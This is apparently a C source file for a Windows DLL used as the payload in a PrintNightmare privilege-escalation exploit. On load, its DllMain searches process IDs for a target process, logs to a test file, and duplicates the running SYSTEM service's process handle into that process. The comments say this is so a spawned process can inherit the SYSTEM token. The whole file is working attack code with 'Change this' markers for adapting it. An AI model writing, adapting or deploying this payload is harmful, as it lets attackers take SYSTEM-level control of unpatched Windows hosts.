#include <stdio.h>
#include <windows.h>
#include <psapi.h>

#define APP_NAME "PrintNightmare" //Change this
#define MAX_PID 64000

BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		FILE *fLog = fopen("C:\\Test\\PNlog.txt", "w"); //Change or delete this

		//Find the app's process (unique app name needed)
		HANDLE hProcess;
		char processName[MAX_PATH];
		for (int pid = 0; pid < MAX_PID; pid += 4)
		{
			if (hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid))
			{
				GetModuleBaseNameA(hProcess, 0, processName, sizeof(processName));
				if (strstr(processName, APP_NAME))
				{
					fprintf(fLog, "Found %s with pid %d\n", APP_NAME, pid);
					break;
				}
				else
				{
					fprintf(fLog, "Incorrect process %s with pid %d\n", processName, pid);
				}
			}
		}

		// Create a SYSTEM process handle which is valid in the app's process
		// We will use this as a parent to create a process from the app and inherit SYSTEM process token
		// We can't create a cmd.exe process from here with CREATE_NEW_CONSOLE because 
		// services do'nt have access to Window Stations
		HANDLE hDupProcess;
		if (!DuplicateHandle(GetCurrentProcess(), GetCurrentProcess(), hProcess, &hDupProcess, PROCESS_ALL_ACCESS, false, 0))
		{
			fprintf(fLog, "DuplicateHandle error %d\n", GetLastError());
		}
		else
		{
			fprintf(fLog, "Duplicated handle: %p\n", hDupProcess);
		}
		//CloseHandle(hProcess);

		fflush(fLog);
		fclose(fLog);
	}
	return true;
}